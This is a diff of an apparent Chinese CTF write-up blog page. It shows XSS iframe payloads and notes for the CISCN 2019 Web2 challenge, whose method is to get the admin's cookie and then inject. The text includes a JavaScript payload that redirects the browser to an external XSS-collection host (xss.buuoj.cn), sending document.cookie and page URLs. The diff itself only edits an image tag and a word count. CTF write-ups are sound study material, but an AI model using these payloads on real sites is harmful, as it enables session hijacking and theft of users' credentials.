@@ -450,7 +450,7 @@ Name<span class="token punctuation">:</span> <span class="token markup"><span cl
 <span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>height<span class="token operator">=</span><span class="token number">0</span> width<span class="token operator">=</span><span class="token number">0</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token operator">></span> 
 <span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span>
 <span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token number">1</span> onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span> y<span class="token operator">=</span><span class="token number">2016</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>iframe<span class="token operator">></span> </code></pre>
-<h4 id="CISCN-2019-华东北赛区-Web2"><a href="#CISCN-2019-华东北赛区-Web2" class="headerlink" title="CISCN 2019 华东北赛区 Web2"></a>CISCN 2019 华东北赛区 Web2</h4><p><img src="1.png" alt=""><br>方法： 投稿-》反馈-》获得管理员cookie-》注入</p>
+<h4 id="CISCN-2019-华东北赛区-Web2"><a href="#CISCN-2019-华东北赛区-Web2" class="headerlink" title="CISCN 2019 华东北赛区 Web2"></a>CISCN 2019 华东北赛区 Web2</h4><p>方法： 投稿-》反馈-》获得管理员cookie-》注入</p>
 <p>HTML Markup转码</p>
 <pre><code>in_str = &quot;(function(){window.location.href=&#39;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;
 
@@ -817,7 +817,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">157.1k</span>&nbsp;字
+                class="white-color">160.1k</span>&nbsp;字
             
             
             
